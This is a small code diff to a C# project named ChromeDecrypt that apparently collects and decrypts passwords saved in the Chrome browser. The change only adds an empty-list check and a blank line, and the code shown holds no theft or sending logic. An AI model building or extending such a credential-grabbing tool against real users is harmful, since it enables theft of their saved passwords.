@@ -10,6 +10,10 @@ namespace ChromeDecrypt
         {
             var grab = new DBGrab();
             var data = grab.GetCPP();
+            if (data.Count == 0)
+            {
+                return;
+            }
             var dec = new CDecrypt();
 
             foreach (var profile in data)
@@ -25,5 +29,6 @@ namespace ChromeDecrypt
         {
             OnPasswordReady?.Invoke(output);
         }
+
     }
 }
